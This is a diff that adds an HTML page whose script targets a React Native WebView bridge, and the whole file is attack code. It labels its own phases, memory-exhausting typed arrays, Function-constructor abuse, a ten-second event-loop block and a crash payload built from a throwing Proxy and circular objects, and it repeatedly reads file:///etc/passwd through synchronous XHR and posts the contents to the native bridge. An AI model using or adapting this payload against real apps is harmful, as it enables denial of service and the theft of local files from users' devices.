@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<body>
+  <script>
+    (function() {
+      const bridge = window.webkit?.messageHandlers?.ReactNativeWebView;
+      if (!bridge) return;
+
+      // Phase 1: Type Confusion Attack
+      const typedArrays = [
+        new Float64Array(1000000),
+        new BigUint64Array(500000),
+        new ArrayBuffer(1024 * 1024 * 10)
+      ];
+      
+      // Phase 2: Function constructor abuse
+      const maliciousFunc = function() {
+        const self = arguments.callee;
+        return function() {
+          return self.constructor('debugger;')();
+        };
+      };
+      
+      // Phase 3: Event loop blockade
+      function blockEventLoop() {
+        const start = Date.now();
+        while(Date.now() - start < 10000) {
+          // Block main thread for 10 seconds
+          try {
+            JSON.parse('{'.repeat(100000));
+          } catch(e) {}
+        }
+      }
+      
+      // Phase 4: Synchronous XHR bombardment
+      for(let i = 0; i < 100; i++) {
+        try {
+          const xhr = new XMLHttpRequest();
+          xhr.open('GET', 'file:///etc/passwd', false);
+          xhr.send();
+          bridge.postMessage({xhrResult: xhr.responseText});
+        } catch(e) {}
+      }
+      
+      // Phase 5: Final blow - mixed payload
+      setTimeout(() => {
+        const finalPayload = {
+          // Deep nested
+          level1: { level2: { level3: { 
+            get level4() { 
+              return new Proxy({}, {
+                get(target, prop) {
+                  if (prop === 'toString') {
+                    return () => { 
+                      throw new Error('Native Crash Triggered');
+                    };
+                  }
+                  return target[prop];
+                }
+              });
+            }
+          }}},
+          // Binary data
+          binary: new Uint8Array(100000).fill(255),
+          // Invalid date
+          date: new Date('invalid-date-string'),
+          // Self-referential
+          circular: {}
+        };
+        finalPayload.circular.self = finalPayload.circular;
+        
+        try {
+          bridge.postMessage(finalPayload);
+          bridge.postMessage(blockEventLoop);
+          bridge.postMessage(maliciousFunc);
+        } catch(e) {
+          // Crash mungkin sudah terjadi
+        }
+      }, 500);
+    })();
+  </script>
+</body>
+</html>
